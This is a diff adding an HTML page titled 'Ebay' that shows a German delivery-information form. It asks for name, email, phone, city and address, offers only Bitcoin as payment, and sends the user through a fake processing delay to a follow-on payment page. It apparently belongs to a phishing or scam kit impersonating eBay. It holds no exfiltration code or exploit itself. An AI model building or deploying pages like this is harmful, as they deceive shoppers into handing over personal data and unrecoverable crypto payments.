@@ -1,0 +1,183 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Ebay</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #f5f5f5;
+      margin: 0;
+      padding: 0;
+    }
+
+    .container {
+      max-width: 480px;
+      margin: 0 auto;
+      padding: 20px;
+    }
+
+    .form-card {
+      background: #ffffff;
+      padding: 20px;
+      border-radius: 14px;
+      box-shadow: 0 4px 20px rgba(0,0,0,0.08);
+    }
+
+    h2 {
+      text-align: center;
+      margin-bottom: 20px;
+      font-size: 1.4rem;
+      font-weight: 700;
+    }
+
+    .form-group {
+      margin-bottom: 18px;
+      display: flex;
+      flex-direction: column;
+    }
+
+    .label-icon {
+      display: flex;
+      align-items: center;
+      font-weight: 600;
+      margin-bottom: 6px;
+      font-size: 0.95rem;
+      color: #333;
+    }
+
+    .label-icon img {
+      width: 20px;
+      height: 20px;
+      margin-right: 6px;
+    }
+
+    input {
+      width: 100%;
+      padding: 12px;
+      border: 1px solid #ccc;
+      border-radius: 10px;
+      font-size: 1rem;
+    }
+
+    input:focus {
+      outline: none;
+      border-color: #4a72ff;
+      box-shadow: 0 0 5px rgba(74,114,255,0.3);
+    }
+
+    button {
+      width: 100%;
+      padding: 14px;
+      background: #0077ff;
+      color: white;
+      font-size: 1.1rem;
+      border: none;
+      border-radius: 12px;
+      font-weight: bold;
+      margin-top: 10px;
+      cursor: pointer;
+    }
+
+    button:active {
+      transform: scale(0.98);
+    }
+
+    @media (max-width: 420px) {
+      .container {
+        padding: 14px;
+      }
+      .form-card {
+        padding: 18px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <!-- <div class="container"> -->
+    <div class="form-card">
+      <h2>Lieferinformationen</h2>
+
+      <form id="deliveryForm" onsubmit="event.preventDefault(); window.location.href='c.html';">
+        <div class="form-group">
+          <label class="label-icon">
+            <img src="https://cdn-icons-png.flaticon.com/512/1077/1077114.png" /> Vollständiger Name
+          </label>
+          <input type="text" required placeholder="Enter full name" />
+        </div>
+
+        <div class="form-group">
+          <label class="label-icon">
+            <img src="https://cdn-icons-png.flaticon.com/512/561/561127.png" /> E-Mail Adresse
+          </label>
+          <input type="email" required placeholder="Enter your email" />
+        </div>
+
+        <div class="form-group">
+          <label class="label-icon">
+            <img src="https://cdn-icons-png.flaticon.com/512/724/724664.png" /> Telefonnummer
+          </label>
+          <input type="tel" required placeholder="Enter phone number" />
+        </div>
+
+        <div class="form-group">
+          <label class="label-icon">
+            <img src="https://cdn-icons-png.flaticon.com/512/484/484167.png" /> Stadt Deutschland
+          </label>
+          <input type="text" required placeholder="Enter your city" />
+        </div>
+
+        <div class="form-group">
+          <label class="label-icon">
+            <img src="https://cdn-icons-png.flaticon.com/128/535/535239.png" /> vollständige Adresse
+          </label>
+          <input type="text" required placeholder="House number, street, postcode" />
+        </div>
+        <div class="form-group">
+          <label class="label-icon">
+            <img src="https://www.web2ink.com/wp-content/uploads/2019/04/payment-logos.png" /> Zahlungsmethode auswählen
+          </label>
+          <!-- <input type="text" required placeholder="House number, street, postcode" /> -->
+           <select style=" width: 100%;
+      padding: 12px;
+      border: 1px solid #ccc;
+      border-radius: 10px;
+      font-size: 1rem;" name="" required id="">
+            <option value="" selected hidden>Zahlungsmethode auswählen</option>
+            <!-- <option value="" disabled selected>Use card (Unavaliable)</option> -->
+            <option value="">Bitcoin (BTC)</option>
+           </select>
+        </div>
+
+        <button type="submit">Fortsetzen</button>
+      </form>
+
+<!-- Loading overlay -->
+<div id="loadingOverlay" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.35); backdrop-filter:blur(2px); z-index:9999; justify-content:center; align-items:center;">
+  <div style="background:#fff; padding:20px 30px; border-radius:12px; font-size:16px; font-weight:600; box-shadow:0 4px 20px rgba(0,0,0,0.15);">
+    Processing... Please wait
+  </div>
+</div>
+
+    </div>
+  </div>
+<script>
+// Form submission with loading animation
+const form = document.getElementById('deliveryForm');
+const loadingOverlay = document.getElementById('loadingOverlay');
+
+form.addEventListener('submit', function(e) {
+  e.preventDefault(); // prevent default submission
+
+  // Show loading overlay
+  loadingOverlay.style.display = 'block';
+
+  // Simulate processing delay then redirect
+  setTimeout(() => {
+    window.location.href = 'user-payment1.html';
+  }, 3000);
+});
+</script>
+</body>
+</html>
